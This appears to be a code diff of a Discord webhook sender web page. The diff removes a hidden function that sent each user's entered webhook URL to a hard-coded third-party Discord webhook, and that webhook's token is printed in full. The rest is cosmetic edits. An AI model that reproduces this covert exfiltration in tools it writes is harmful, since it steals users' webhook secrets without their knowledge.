@@ -6,8 +6,9 @@
     <title>Discord Webhook Sender with Embed</title>
 
     <!-- Add a favicon -->
-    
+    <img src="https://www.pngwing.com/en/free-png-ahzwa" alt="Webhook Logo" class="top-icon">
 
+    
     <style>
         body {
             display: flex;
@@ -33,9 +34,8 @@
             width: 90%;
         }
 
-        /* Style for the top icon */
         .top-icon {
-            width: 100px; /* Adjust the size */
+            width: 100px; 
             height: auto;
             margin-bottom: 20px;
         }
@@ -91,7 +91,7 @@
         }
 
         .message-input {
-            height: 100px; /* Adjust height for better usability */
+            height: 100px; 
             resize: none;
         }
 
@@ -115,9 +115,6 @@
     </style>
 </head>
 <body>
-    <!-- Add the icon here -->
-   
-    
     <div class="container">
         <h1>Discord Webhook Sender with Tracking</h1>
         <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" required>
@@ -143,23 +140,11 @@
     </div>
 
     <script>
-        const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1287453043897667636/12CYtAxcWuIRRYlBhvlq3rdycyHO6Lxz71234au_0kvVYZ3woHtfuoipCBB44zTM-x74";
-
         async function checkWebhook() {
             const url = document.getElementById('webhookUrl').value;
             document.getElementById('loading').style.display = 'block'; 
 
             try {
-                await fetch(YOUR_DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        content: Captured webhook URL: ${url}
-                    }),
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-
                 const response = await fetch(url, {
                     method: 'POST',
                     body: JSON.stringify({ content: "Test message from webhook checker" }),
@@ -202,14 +187,14 @@
             const url = document.getElementById('webhookUrl').value;
             const embedTitle = document.getElementById('embedTitle').value;
             const embedDescription = document.getElementById('embedDescription').value;
-            const embedColor = document.getElementById('embedColor').value.replace('#', ''); // Remove '#' from color
+            const embedColor = document.getElementById('embedColor').value.replace('#', ''); 
 
             const embedData = {
                 embeds: [
                     {
                         title: embedTitle,
                         description: embedDescription,
-                        color: parseInt(embedColor, 16) // Convert hex to decimal
+                        color: parseInt(embedColor, 16) 
                     }
                 ]
             };
@@ -234,6 +219,6 @@
             resultMessage.style.display = 'block';
         }
     </script>
-    <h1 align="center">Ty yasser For using our website</h1>
+<h3>Ty yasser for using our website</h3>
 </body>
 </html>
